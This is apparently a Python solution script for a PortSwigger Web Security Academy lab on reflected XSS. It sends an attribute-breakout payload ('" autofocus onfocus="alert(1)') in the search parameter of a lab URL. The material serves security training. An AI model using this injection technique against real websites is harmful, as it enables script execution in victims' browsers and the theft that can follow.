#######################################################################
#
# Lab: Reflected XSS into attribute with angle brackets HTML-encoded
#
# Hack Steps: 
#      1. Inject payload in the search query parameter
#      2. Observe that the alert function has been called
#
#######################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aaf0034042c041581916bab00290042.web-security-academy.net"

def main(): 
    payload = """ " autofocus onfocus="alert(1) """
    
    print("❯❯ Injecting payload in the search query parameter.. ", end="", flush=True)
    
    try:
        requests.get(f"{LAB_URL}?search={payload}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()